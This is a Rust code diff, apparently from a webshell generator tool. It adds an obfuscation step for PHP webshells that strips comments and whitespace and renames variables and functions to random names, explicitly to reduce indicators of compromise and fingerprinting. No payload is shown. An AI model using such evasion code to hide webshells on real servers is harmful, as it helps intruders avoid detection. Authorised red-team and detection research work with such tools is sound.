@@ -6,6 +6,7 @@ use regex::Regex;
 use sha2::{Digest, Sha512};
 
 use crate::cli_arguments::CliArguments;
+use crate::enums::template::Template;
 use crate::generate_random_string::{generate_password, generate_random_string};
 
 pub fn generate_webshell(args: &CliArguments) -> anyhow::Result<()> {
@@ -102,7 +103,7 @@ pub fn generate_webshell(args: &CliArguments) -> anyhow::Result<()> {
 
 	if args.obfuscate {
 		info!("Obfuscating the generated code");
-		code = minify(&code);
+		code = minify(&code, args);
 	}
 
 	let output_path = PathBuf::from(args.output.as_ref().unwrap());
@@ -129,19 +130,48 @@ fn extract_unique_strings(input: &str, pattern: &str) -> Vec<String> {
 }
 
 /// Remove comments from the file content
-fn minify(file_content: &str) -> String {
+fn minify(file_content: &str, args: &CliArguments) -> String {
 	// Regex patterns for line comments (// ...) and multiline comments (/* ... */)
 	let comments_patters = Regex::new(r#"([^:]//.*|/\*(.|\s)*?\*/)"#).unwrap();
 
 	// Remove comments
-	let content_without_comments = comments_patters.replace_all(file_content, "");
+	let mut minified_content = comments_patters.replace_all(file_content, "").to_string();
 
-	let php_opening_tag = Regex::new(r#"<\?php\s*"#).unwrap();
-	let php_fixed = php_opening_tag.replace_all(&content_without_comments, "<?php ");
+	minified_content = match args.template {
+		Template::Php => {
+			// Replace "<?php\s*" with "<?php " to avoid dropping the whitespace after the opening tag
+			let php_opening_tag = Regex::new(r#"<\?php\s*"#).unwrap();
+			minified_content = php_opening_tag.replace_all(&minified_content, "<?php ").to_string();
 
-	let minified_content = php_fixed.replace("\n", "")
-	                                .replace("\r", "")
-	                                .replace("\t", "")
-	                                .replace("  ", "");
+			// Search variable definitions and rename them to shorter casual names to reduce IOC and fingerprinting
+			let all_var_definitions = extract_unique_strings(&minified_content, r#"\$\w+"#);
+			let php_global_excluded_variables = all_var_definitions.iter().filter(|var| !var.starts_with("$_")).collect::<Vec<_>>();
+			debug!("Php variable definitions (without globals): {:?}", php_global_excluded_variables);
+
+			for var in php_global_excluded_variables.iter() {
+				let casual_name = generate_random_string(format!("${}", args.obfuscation_format).as_str()).unwrap();
+				minified_content = minified_content.replace(*var, &casual_name);
+			}
+
+			// search function definition and rename them to shorter casual names to reduce IOC and fingerprinting
+			let all_func_definitions = extract_unique_strings(&minified_content, r#"function\s+\w+"#);
+			debug!("Php function definitions: {:?}", all_func_definitions);
+
+			for func in all_func_definitions.iter() {
+				let casual_name = generate_random_string(format!("function {}", args.obfuscation_format).as_str()).unwrap();
+				minified_content = minified_content.replace(func, &casual_name);
+			}
+
+			minified_content
+		}
+		#[allow(unreachable_patterns)]
+		_ => minified_content
+	};
+
+	// Remove whitespaces, tabs, newlines, and double spaces
+	minified_content = minified_content.replace("\n", "")
+	                                   .replace("\r", "")
+	                                   .replace("\t", "")
+	                                   .replace("  ", "");
 	minified_content
 }
